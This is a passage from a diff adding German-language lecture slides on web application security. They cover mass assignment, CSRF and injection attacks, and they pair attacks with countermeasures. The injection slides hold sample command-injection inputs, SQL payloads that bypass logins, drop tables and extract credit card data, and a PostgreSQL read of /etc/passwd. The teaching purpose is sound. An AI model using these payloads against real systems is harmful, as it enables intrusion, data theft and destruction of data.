+<li>HTTP GET oder PATCH statt POST?</li>
+<li>Zusätzliches Feld “admin”: “1” im Datensatz?</li>
+</ul>
+</section></section>
+<section>
+<section id="problem-mass-assignments" class="title-slide slide level1">
+<h1>Problem: Mass Assignments</h1>
+
+</section>
+<section id="mass-assignment-als-automatisierung" class="slide level2">
+<h2>Mass-Assignment als Automatisierung</h2>
+<p>Parameter werden automatisch zugeordnet</p>
+<p>Request:</p>
+<pre class="http"><code>POST /user/1/update HTTP/1.1
+
+user[name]=happe&amp;user[email]=ah@mybloodtypeis.coffee</code></pre>
+<p>Source Code:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ot">@user</span> <span class="kw">=</span> <span class="dt">User</span><span class="at">.find</span>(params<span class="kw">[</span><span class="wa">:id</span><span class="kw">]</span>)</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ot">@user</span><span class="at">.update</span>(params<span class="kw">[</span><span class="wa">:user</span><span class="kw">]</span>)</span></code></pre></div>
+</section>
+<section id="probleme-bei-mass-assignments" class="slide level2">
+<h2>Probleme bei Mass Assignments</h2>
+<p>Angreifer:</p>
+<pre><code>user[id]=1&amp;user[name]=happe&amp;user[role]=admin</code></pre>
+</section>
+<section id="mass-assignments-lösung" class="slide level2">
+<h2>Mass Assignments: Lösung</h2>
+<p>Lösung: dezidiert zum Update erlaubte Felder definieren</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ot">@user</span><span class="at">.update</span>(user_params)</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="cf">def</span> user_params</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>  params<span class="at">.require</span>(<span class="wa">:user</span>)<span class="at">.permit</span>(<span class="wa">:name</span>)</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="cf">end</span></span></code></pre></div>
+</section></section>
+<section>
+<section id="problem-csrf-angriffe" class="title-slide slide level1">
+<h1>Problem: CSRF-Angriffe</h1>
+
+</section>
+<section id="csrf-angriffe" class="slide level2">
+<h2>CSRF-Angriffe</h2>
+<ul>
+<li>Nutzen ein bestehendes Vertrauensverhältnis zwischen (Opfer) Web-Browser und einem Webserver aus</li>
+<li>Grundproblem: Browser verschickt automatisch Session-Cookies beim Zugriff auf entfernte Server</li>
+<li>Durch ein verstecktes Formular auf einer fremden Webseite wird eine Operation mit den Rechten des Opfers auf einer anderen Webseite ausgeführt</li>
+</ul>
+</section>
+<section id="flow" class="slide level2">
+<h2>Flow</h2>
+<img data-src="0x06_csrf.png" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="gegenmaßname-synchronizer-token" class="slide level2">
+<h2>Gegenmaßname: Synchronizer Token</h2>
+<ul>
+<li>Server setzt (zufälliges) Token bei jedem Formular und vergleicht ob dieses mit dem serverseitigen Token übereinstimmt</li>
+<li>Token sollte regelmässig neu generiert werden</li>
+<li>Was passiert wenn kein CSRF-Token Feld mit übergeben wird?</li>
+</ul>
+</section>
+<section id="gegenmaßnahme-samesite-flag" class="slide level2">
+<h2>Gegenmaßnahme: SameSite-Flag</h2>
+<ul>
+<li>Same-Site Flag bei Cookies</li>
+<li>Strict: Cookie wird nie Cross-Site übertragen</li>
+<li>Lax: Nur Cross-Site wenn Navigation</li>
+<li>Default ab Chrome 80</li>
+</ul>
+</section>
+<section id="achtung-site-origin" class="slide level2">
+<h2>Achtung: Site != Origin</h2>
+<ul>
+<li>Site: eTld+1</li>
+<li>Origin: Schema + Domainname + Port</li>
+</ul>
+<table>
+<thead>
+<tr class="header">
+<th></th>
+<th>Origin</th>
+<th>Site</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>https://a.snikt.net</td>
+<td>https://a.snikt.net:443</td>
+<td>snikt.net</td>
+</tr>
+<tr class="even">
+<td>https://b.snikt.net</td>
+<td>https://b.snikt.net:443</td>
+<td>snikt.net</td>
+</tr>
+<tr class="odd">
+<td>https://a.tw.ac.at</td>
+<td>https://a.tw.ac.at:443</td>
+<td>tw.ac.at</td>
+</tr>
+<tr class="even">
+<td>https://b.tw.ac.at</td>
+<td>https://b.tw.ac.at:443</td>
+<td>tw.ac.at</td>
+</tr>
+<tr class="odd">
+<td>a.github.io</td>
+<td>https://a.github.io:443</td>
+<td>a.github.io</td>
+</tr>
+</tbody>
+</table>
+</section></section>
+<section>
+<section id="problem-authorization-in-alternate-channels" class="title-slide slide level1">
+<h1>Problem: Authorization in Alternate Channels</h1>
+
+</section>
+<section id="grundproblem-1" class="slide level2">
+<h2>Grundproblem</h2>
+<p>Die Zugriffsrechte müssen zwischen diesen gesamten Schnittstellen abgeglichen werden.</p>
+<p>Beispiel:</p>
+<ul>
+<li>eine Webseite</li>
+<li>als WebServices für mobile Clients</li>
+<li>eine REST-API</li>
+<li>WebSocket-Schnittstelle</li>
+</ul>
+</section></section>
+<section>
+<section id="injection-attacks" class="title-slide slide level1">
+<h1>Injection Attacks</h1>
+
+</section>
+<section id="grundproblem-2" class="slide level2">
+<h2>Grundproblem</h2>
+<ul>
+<li>Garbage In/Garbage Out</li>
+<li>Never trust user (input)</li>
+<li>Switch von Daten-Context auf Befehls-Context
+<ul>
+<li>Ausführung am Web-, App- oder Datenbank-Server</li>
+<li>mit (hoffentlich) den entsprechenden Rechten</li>
+</ul></li>
+</ul>
+</section>
+<section id="wie-zu-testen" class="slide level2">
+<h2>Wie zu testen?</h2>
+<ul>
+<li>Gut automatisiert testbar
+<ul>
+<li>Web Application Security Scanner</li>
+<li>Tools für Spezialbereiche wie SQLi</li>
+</ul></li>
+</ul>
+</section>
+<section id="gegenmassnahmen" class="slide level2">
+<h2>Gegenmassnahmen</h2>
+<ul>
+<li>Überprüfung aller Eingaben
+<ul>
+<li>immer mit Bibliotheken da zu viele Möglichkeiten</li>
+</ul></li>
+<li>Quoting der Ausgaben/bei der Verwendung
+<ul>
+<li>teilweise automatisch durch Frameworks</li>
+</ul></li>
+<li>Minimize Impact
+<ul>
+<li>Sandboxes</li>
+<li>CSP</li>
+</ul></li>
+</ul>
+</section>
+<section id="problem-große-angriffsfläche" class="slide level2">
+<h2>Problem: Große Angriffsfläche</h2>
+</section></section>
+<section>
+<section id="command-injections" class="title-slide slide level1">
+<h1>Command Injections</h1>
+
+</section>
+<section id="allgemein" class="slide level2">
+<h2>Allgemein</h2>
+<ul>
+<li>Webapplikation mit dynamischer Web-Operation</li>
+<li>diese wird über ein Systemkommando breitgestellt</li>
+<li>Angreifer versucht das Kommando zu “überladen”..</li>
+<li>.. und kann dadurch “eigene” Kommandos ausführen</li>
+<li>use-case: mit netcat eine Session/Listener aufmachen</li>
+</ul>
+</section>
+<section id="beispiel-router-mit-ping" class="slide level2">
+<h2>Beispiel: Router mit Ping</h2>
+<p>http://192.168.1.1/test_connectivity?domain=snikt.net</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>domain <span class="op">=</span> user_input()</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>os.system(<span class="st">&#39;ping &#39;</span> <span class="op">+</span> domain)</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="co"># führt zu</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>ping snikt.net</span></code></pre></div>
+<pre><code># Versuche mit:
+;ls
+$(ls)
+`ls`
+
+# Ergebnis:
+ping www.snikt.net;ls</code></pre>
+</section>
+<section id="beispiel-tp-link-router" class="slide level2">
+<h2>Beispiel: TP-Link Router</h2>
+<ul>
+<li><a href="https://openwrt.org/toh/tp-link/tl-wr703n">Flash Instruction</a></li>
+</ul>
+</section>
+<section id="gefährliche-funktionen" class="slide level2">
+<h2>Gefährliche Funktionen</h2>
+<ul>
+<li>Java
+<ul>
+<li>Runtime.exec(), getRuntime.exec(), ProcessBuilder.start()</li>
+</ul></li>
+<li>PHP
+<ul>
+<li>system, shell_exec, exec, proc_open, eval, passthru, proc_open, expect_open, ssh2_exec, popen</li>
+</ul></li>
+<li>Python
+<ul>
+<li>exec, eval, os.system, os.popen, subprocess.popen, subprocess.call</li>
+</ul></li>
+</ul>
+</section>
+<section id="gegenmassnahme" class="slide level2">
+<h2>Gegenmassnahme</h2>
+<ul>
+<li>Bibliotheken statt Kommandozeilenaufrufe verwenden</li>
+<li>z.B. Netzwerkbibliotheken statt ping aufrufen</li>
+</ul>
+</section></section>
+<section>
+<section id="sql-injections" class="title-slide slide level1">
+<h1>SQL-Injections</h1>
+
+</section>
+<section id="grundproblem-owasp" class="slide level2">
+<h2>Grundproblem (OWASP)</h2>
+<pre><code>SQL injection errors occur when:
+  * Data enters a program from an untrusted source.
+  * The data used to dynamically construct a SQL query</code></pre>
+</section>
+<section id="sql-very-basics" class="slide level2">
+<h2>SQL: very basics</h2>
+<div class="sourceCode" id="cb18"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> column1, column2 <span class="kw">from</span> table1, table2</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="kw">where</span> column1 <span class="op">=</span> ‘xyz’</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="kw">order</span> <span class="kw">by</span> column1 <span class="kw">asc</span><span class="op">/</span><span class="kw">desc</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="kw">limit</span> <span class="dv">1</span>;</span></code></pre></div>
+</section>
+<section id="sql-union-select" class="slide level2">
+<h2>SQL: UNION select</h2>
+<div class="sourceCode" id="cb19"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> column1, column22 <span class="kw">from</span> table1, table2</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="kw">where</span> conditions</span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="kw">order</span> <span class="kw">by</span> column1 <span class="kw">asc</span><span class="op">/</span><span class="kw">desc</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="kw">union</span> <span class="kw">all</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> column3, column4 <span class="kw">from</span> table4, table5;</span></code></pre></div>
+</section>
+<section id="sql-injection-attacks" class="slide level2">
+<h2>SQL Injection Attacks</h2>
+</section>
+<section id="simples-beispiel" class="slide level2">
+<h2>Simples Beispiel</h2>
+<ul>
+<li>Kino-Portal:</li>
+<li>Login: https://kino.local/login.php?username=ah&amp;password=pw</li>
+</ul>
+<p>Hintergrund: SQL Operation wird mit String Concat gebaut</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> <span class="st">&quot;select * from users &quot;</span><span class="op">;</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> query <span class="op">+</span> <span class="st">&quot;where username = &#39;&quot;</span> <span class="op">+</span>username <span class="op">+</span> <span class="st">&quot;&#39;&quot;</span><span class="op">;</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> query <span class="op">+</span> <span class="st">&quot; and password = &#39;&quot;</span> <span class="op">+</span>password <span class="op">+</span><span class="st">&quot;&#39; limit 1;</span></span></code></pre></div>
+</section>
+<section id="simples-beispiel-1" class="slide level2">
+<h2>Simples Beispiel</h2>
+<p>Angreifer wählt Passwort:</p>
+<pre><code>1’ or ‘1’=’1</code></pre>
+<p>Ergebnis:</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> users </span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="kw">where</span> username <span class="op">=</span> ‘ah‘ <span class="kw">and</span> <span class="kw">password</span> <span class="op">=</span> ‘1’ <span class="kw">or</span> ‘1’ <span class="op">=</span> ‘1’ <span class="kw">limit</span> <span class="dv">1</span>;</span></code></pre></div>
+</section>
+<section id="stacked-queries" class="slide level2">
+<h2>Stacked Queries</h2>
+<div class="sourceCode" id="cb23"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a># URL</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>http:<span class="op">//</span>snikt.net<span class="op">/</span>test.php?<span class="kw">id</span><span class="op">=</span><span class="dv">1</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a># Operation:</span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> articles <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a># Eingabe</span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a><span class="dv">1</span>; <span class="kw">drop</span> <span class="kw">table</span> users; <span class="co">--</span></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a># Ergebnis</span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> articles <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span>;<span class="kw">drop</span> <span class="kw">table</span> users;<span class="co">--</span></span></code></pre></div>
+</section>
+<section id="union-based-sqli" class="slide level2">
+<h2>Union-Based SQLi</h2>
+<ul>
+<li>Weboberfläche</li>
+<li>https://snikt.net/addressbook_search?user_id=1</li>
+<li>Ergebnis wird in einer Tabelle angezeigt</li>
+</ul>
+<pre><code># Datenquelle:
+select Name, Phone, Address FROM users where user_id=1</code></pre>
+</section>
+<section id="union-based-sql-kommando" class="slide level2">
+<h2>Union-Based-SQL Kommando</h2>
+<ul>
+<li>Folgende Eingabe fuer id:</li>
+</ul>
+<pre><code>  1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</code></pre>
+<ul>
+<li>Spaltenanzahl erraten</li>
+</ul>
+</section>
+<section id="union-based-sqli-ergebnis" class="slide level2">
+<h2>Union-Based SQLi: Ergebnis:</h2>
+<div class="sourceCode" id="cb26"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> Name, Phone, Address <span class="kw">FROM</span> Users <span class="kw">WHERE</span> <span class="kw">Id</span><span class="op">=</span><span class="dv">1</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="kw">UNION</span> <span class="kw">ALL</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> creditCardNumber,<span class="dv">1</span>,<span class="dv">1</span> <span class="kw">FROM</span> CreditCardTable</span></code></pre></div>
+</section>
+<section id="error-based-sqli" class="slide level2">
+<h2>Error-based SQLi</h2>
+<p>Eine Datenbank-Fehlermeldung wird als Rückkanal verwendet</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a># <span class="kw">normal</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> <span class="kw">table</span> <span class="kw">where</span> <span class="kw">id</span> <span class="op">=</span> <span class="dv">1</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a># angriff</span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> <span class="kw">table</span> <span class="kw">where</span> <span class="kw">id</span> <span class="op">=</span> (<span class="kw">select</span> username, <span class="kw">password</span> <span class="kw">from</span> users);</span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a># fehlermeldung:</span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a>Cannot compare <span class="kw">id</span> (<span class="dt">integer</span>) <span class="kw">with</span> [<span class="ot">&quot;root&quot;</span>, <span class="ot">&quot;password&quot;</span>]</span></code></pre></div>
+</section>
+<section id="beispiel-boolean-based-blind-sqli" class="slide level2">
+<h2>Beispiel: Boolean-based blind SQLi</h2>
+<ul>
+<li>URL: http://snikt.net/show_user?id=1</li>
+<li>Annahmen:
+<ul>
+<li>Query: select * from users where id = 1;</li>
+<li>id besitzt Injection-Lücke</li>
+<li>Aber kein Ausgabekanal in der Seite</li>
+</ul></li>
+</ul>
+</section>
+<section id="code-kann-angehängt-werden.." class="slide level2">
+<h2>Code kann angehängt werden..</h2>
+<div class="sourceCode" id="cb28"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a># <span class="kw">id</span>: <span class="ot">&quot;1 and 1=1&quot;</span> <span class="op">-&gt;</span> <span class="fu">user</span> wird angezeigt</span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> users <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">and</span> <span class="dv">1</span><span class="op">=</span><span class="dv">1</span>;</span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a># <span class="kw">id</span>: <span class="ot">&quot;1 and 1=0&quot;</span> <span class="op">-&gt;</span> Kein Produkt wird angezeigt</span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> users <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">and</span> <span class="dv">1</span><span class="op">=</span><span class="dv">0</span>;</span></code></pre></div>
+</section>
+<section id="beispiel-auslesen-der-ersten-stelle-eines-benutzernamens" class="slide level2">
+<h2>Beispiel: Auslesen der ersten Stelle eines Benutzernamens</h2>
+<div class="sourceCode" id="cb29"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="kw">FROM</span> Users</span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="kw">WHERE</span> <span class="kw">Id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">AND</span> <span class="fu">ASCII</span>(SUBSTRING(username,<span class="dv">1</span>,<span class="dv">1</span>))<span class="op">=</span><span class="dv">97</span></span></code></pre></div>
+</section>
+<section id="bespiel-time-based-blind-sqli" class="slide level2">
+<h2>Bespiel: time-based blind SQLi</h2>
+<ul>
+<li>Kein Antwortkanal verfügbar</li>
+<li>Eigentlich ein Side-Channel Attack über Timing</li>
+<li>Operation: http://www.example.com/product.php?id=10</li>
+</ul>
+<div class="sourceCode" id="cb30"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a># <span class="kw">id</span>: <span class="ot">&quot;10 AND..&quot;</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> products <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">10</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="kw">AND</span> <span class="cf">IF</span>(version() <span class="kw">like</span> ‘<span class="dv">5</span>%’, sleep(<span class="dv">10</span>), ‘false’))<span class="co">--</span></span></code></pre></div>
+</section>
+<section id="tooling-sqlmap" class="slide level2">
+<h2>Tooling: SQLMap</h2>
+<ul>
+<li>Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, HSQLDB and H2 database management systems.</li>
+<li>Full support for five SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based and stacked queries.</li>
+</ul>
+</section>
+<section id="problem-database-escape" class="slide level2">
+<h2>Problem: Database-Escape</h2>
+<ul>
+<li>MySQL, PostgreSQL und MSSQL erlauben es, Kommandos ausgehend von SQL auszuführen</li>
+<li>z.B. xp_cmdshell bei MSSQL</li>
+</ul>
+<p>Postgresql (user muss db admin sein)</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>postgres<span class="op">-</span># <span class="kw">CREATE</span> <span class="kw">TABLE</span> temp(t TEXT);</span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a>postgres<span class="op">-</span># <span class="kw">COPY</span> temp <span class="kw">FROM</span> <span class="st">&#39;/etc/passwd&#39;</span>;</span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>postgres<span class="op">-</span># <span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> temp <span class="kw">limit</span> <span class="dv">1</span> offset <span class="dv">0</span>;</span></code></pre></div>
+</section>
+<section id="gegenmaßnahmen" class="slide level2">
+<h2>Gegenmaßnahmen</h2>
+</section>
+<section id="gegenmaßnahme-prepared-statement" class="slide level2">
+<h2>Gegenmaßnahme: Prepared Statement</h2>
+<div class="sourceCode" id="cb32"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> custname <span class="op">=</span> request<span class="op">.</span><span class="fu">getParameter</span><span class="op">(</span><span class="st">&quot;customerName&quot;</span><span class="op">);</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> query <span class="op">=</span> <span class="st">&quot;SELECT account_balance FROM user_data WHERE user_name = ? &quot;</span><span class="op">;</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="bu">PreparedStatement</span> pstmt <span class="op">=</span> connection<span class="op">.</span><span class="fu">prepareStatement</span><span class="op">(</span> query <span class="op">);</span></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a>pstmt<span class="op">.</span><span class="fu">setString</span><span class="op">(</span> <span class="dv">1</span><span class="op">,</span> custname<span class="op">);</span></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="bu">ResultSet</span> results <span class="op">=</span> pstmt<span class="op">.</span><span class="fu">executeQuery</span><span class="op">(</span> <span class="op">);</span></span></code></pre></div>
+</section>
+<section id="gegenmaßnahme-prepared-statements" class="slide level2">
+<h2>Gegenmaßnahme: Prepared Statements</h2>
+<div class="sourceCode" id="cb33"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="va">$id</span> <span class="op">=</span> <span class="dv">1</span><span class="ot">;</span></span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="va">$sth</span> <span class="op">=</span> <span class="va">$DBH</span>-&gt;prepare(<span class="st">&quot;SELECT * FROM juegos WHERE id = :id&quot;</span>)<span class="ot">;</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="va">$sth</span>-&gt;bindParam(<span class="st">&#39;:id&#39;</span><span class="ot">,</span> <span class="va">$id</span><span class="ot">,</span> <span class="bu">PDO</span>::<span class="cn">PARAM_INT</span>)<span class="ot">;</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="va">$STH</span>-&gt;execute()<span class="ot">;</span></span></code></pre></div>
+</section>
+<section id="gegenmaßnahme-prepared-statements-1" class="slide level2">
+<h2>Gegenmaßnahme: prepared statements</h2>
+<ul>
+<li>Achtung: einige Felder können nicht mittels Prepared Statements abgebildet werden:
+<ul>
+<li>Tabellennamen</li>
+<li>Spaltennamen</li>
+<li>ASC/DESC</li>
+</ul></li>
+<li>In dem Fall: Whitelisting oder Query umbauen</li>
+</ul>
+</section>
+<section id="gegenmaßnahme-prepared-statements-2" class="slide level2">
+<h2>Gegenmaßnahme: prepared statements</h2>
+<ul>
+<li>Vorteil von prepared statements: Logik bleibt in der Applikation</li>
+</ul>
+</section>
+<section id="gegenmaßnahme-escape-input-data" class="slide level2">
+<h2>Gegenmaßnahme: Escape Input Data</h2>
+<ul>
+<li>Last-Resort</li>
+<li>Error-Prone</li>
+<li>Datenbank-spezifisch</li>
+</ul>
+</section>
+<section id="stored-procedures" class="slide level2">
+<h2>Stored Procedures?</h2>
+<ul>
+<li>Können sicher sein, weil stored procedures meistens prepared statements verwenden</li>
+<li>Es gibt aber auch die Möglichkeit eines evals, deswegen muss man den stored procedure code ebenso testen</li>
+</ul>
+</section>
+<section id="orms-sind-automatisch-sicher" class="slide level2">
+<h2>ORMs sind automatisch sicher?</h2>
+<p>Am Beispiel sqlize</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a># example</span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">Items</span><span class="op">.</span><span class="fu">findAll</span>({</span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">limit</span><span class="op">:</span> <span class="st">&#39;1&#39;</span><span class="op">,</span></span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a>})</span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a># not so perfect</span>
+<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">Items</span><span class="op">.</span><span class="fu">findAll</span>({</span>
+<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">limit</span><span class="op">:</span> <span class="st">&#39;1; DROP TABLE Items; --&#39;</span><span class="op">,</span></span>
+<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a>})</span></code></pre></div>
+</section>
+<section id="nosql-mongodb" class="slide level2">
+<h2>NoSQL? MongoDB</h2>
+<div class="sourceCode" id="cb35"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a># example</span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a>db<span class="op">.</span><span class="at">myCollection</span><span class="op">.</span><span class="fu">find</span>({</span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">active</span><span class="op">:</span> <span class="kw">true</span><span class="op">,</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">$where</span><span class="op">:</span> <span class="kw">function</span>() {</span>
